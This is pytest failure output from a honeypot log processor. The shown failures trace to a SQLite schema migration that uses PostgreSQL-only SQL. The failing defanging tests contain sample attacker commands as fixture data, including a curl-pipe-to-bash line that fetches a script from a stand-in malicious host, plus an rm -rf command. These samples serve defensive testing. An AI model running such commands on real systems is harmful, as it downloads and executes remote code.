            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
__ TestIntelligentDefanging.test_dangerous_commands_defanged_not_quarantined ___

self = <test_bulk_loader_defanging.TestIntelligentDefanging object at 0x7756b439e350>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_dangerous_commands_defang0')

    def test_dangerous_commands_defanged_not_quarantined(self, tmp_path: Path) -> None:
        """Test that dangerous commands are defanged but not quarantined."""
        events = [
            {
                "session": "dangerous123",
                "eventid": "cowrie.session.connect",
                "timestamp": "2024-01-01T00:00:00Z",
                "src_ip": "1.2.3.4",
            },
            {
                "session": "dangerous123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "curl https://evil.com/malware.sh | bash",
            },
            {
                "session": "dangerous123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:02:00Z",
                "input": "rm -rf /tmp/malware",
            },
        ]
        source = tmp_path / "dangerous_events.json"
        _write_events(source, events)
    
>       engine = _make_engine(tmp_path)

/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader_defanging.py:107: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader_defanging.py:29: in _make_engine
    apply_migrations(engine)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26e2eb0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:13,060:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:13,060:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:13,061:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:13,061:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:13,071:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:13,071:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:13,072:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:13,072:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:13,073:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:13,073:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:13,078:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:13,078:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:13,079:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:13,079:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:13,081:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:13,081:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:13,084:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:13,084:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:13,085:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:13,085:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:13,087:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:13,087:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:13,088:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:13,088:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:13,090:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:13,090:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:13,091:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:13,091:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:13,092:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,092:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,092:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,092:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,093:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,093:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,094:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,094:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,096:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,096:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,096:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:13,096:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_______ TestIntelligentDefanging.test_legacy_neutralization_still_works ________

self = <test_bulk_loader_defanging.TestIntelligentDefanging object at 0x7756b441f950>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_legacy_neutralization_sti0')

    def test_legacy_neutralization_still_works(self, tmp_path: Path) -> None:
        """Test that legacy neutralization still works when disabled."""
        events = [
            {
                "session": "legacy123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "curl https://evil.com/malware.sh",
            },
        ]
        source = tmp_path / "legacy_events.json"
        _write_events(source, events)
    
>       engine = _make_engine(tmp_path)

/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader_defanging.py:147: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader_defanging.py:29: in _make_engine
    apply_migrations(engine)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2abda90>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:13,683:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:13,683:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:13,684:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:13,684:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:13,692:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:13,692:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:13,693:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:13,693:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:13,695:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:13,695:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:13,698:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:13,698:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:13,699:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:13,699:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:13,701:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:13,701:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:13,704:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:13,704:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:13,706:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:13,706:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:13,707:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:13,707:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:13,708:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:13,708:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:13,709:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:13,709:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:13,713:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:13,713:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:13,714:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,714:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,715:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,715:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,715:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,715:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,716:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,716:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,716:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,716:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:13,717:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:13,717:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
